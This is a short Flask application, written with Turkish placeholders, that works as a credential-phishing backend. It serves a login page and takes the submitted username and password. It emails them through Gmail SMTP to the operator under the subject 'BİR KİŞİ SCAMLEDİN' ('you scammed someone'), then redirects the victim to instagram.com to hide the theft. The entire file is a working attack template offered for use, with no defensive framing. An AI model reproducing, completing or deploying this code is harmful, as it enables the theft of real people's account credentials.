from flask import Flask,render_template,redirect,request
from flask_mail import Mail, Message

app = Flask(__name__)

app.config['MAIL_SERVER']='smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USERNAME'] = 'yan mail adresiniz'
app.config['MAIL_PASSWORD'] = 'mail adresinizin giriş anahtarı.'
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True
mail = Mail(app)

app.secret_key = "raklejfeoeaopj"

def send_email(username, password):
    msg = Message("BİR KİŞİ SCAMLEDİN", sender="yan mail adresiniz", recipients=["Mesaj gelecek mail adresiniz"])
    msg.body = "USERNAME: " + username + "\n Şifre: " + password 
    mail.send(msg)

@app.route("/", methods = ["GET", "POST"])
def index():
    if request.method == "GET":
        return render_template("index.html")
    
    elif request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        send_email(username, password)

        return redirect("https://instagram.com")


if __name__ == "__main__":
    app.run(debug=False)